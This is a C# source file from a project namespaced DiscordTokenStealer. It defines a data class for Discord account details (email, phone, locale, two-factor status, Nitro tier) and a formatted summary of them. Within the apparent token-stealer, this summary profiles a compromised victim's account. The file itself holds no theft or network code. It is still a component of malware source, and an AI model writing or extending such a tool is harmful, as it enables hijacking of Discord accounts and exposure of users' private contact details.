using System.Text;
using System.Text.Json.Serialization;

namespace DiscordTokenStealer.Discord;
public class DiscordUser
{
    [JsonPropertyName("username")] public string Username { get; set; }
    [JsonPropertyName("discriminator")] public string Discriminator { get; set; }
    [JsonPropertyName("id")] public string Id { get; set; }
    [JsonPropertyName("bio")] public string AboutMe { get; set; }
    [JsonPropertyName("locale")] public string Locale { get; set; }
    [JsonPropertyName("mfa_enabled")] public bool TwoFactor { get; set; }
    [JsonPropertyName("email")] public string Email { get; set; }
    [JsonPropertyName("verified")] public bool EmailVerified { get; set; }
    [JsonPropertyName("phone")] public string? PhoneNumber { get; set; }
    [JsonPropertyName("premium_type")] public int? PremiumType { get; set; }
    public DiscordNitroType Nitro => PremiumType.HasValue ? (DiscordNitroType)PremiumType.Value : DiscordNitroType.None;
    public string Summary => new StringBuilder()
                .AppendLine($"\tSummary: {Environment.NewLine}")
                .AppendLine($"\t\tUser: {Username}#{Discriminator} ({Id})")
                .AppendLine($"\t\tEmail: {Email}")
                .AppendLine($"\t\tPhone: {PhoneNumber ?? "None"}")
                .AppendLine($"\t\tLocale: {Locale}")
                .AppendLine($"\t\tVerified: {EmailVerified}")
                .AppendLine($"\t\tTwo-Factor: {TwoFactor}")
                .AppendLine($"\t\tAbout Me: {AboutMe}")
                .AppendLine($"\t\tNitro: {Nitro}")
                .AppendLine().ToString();
}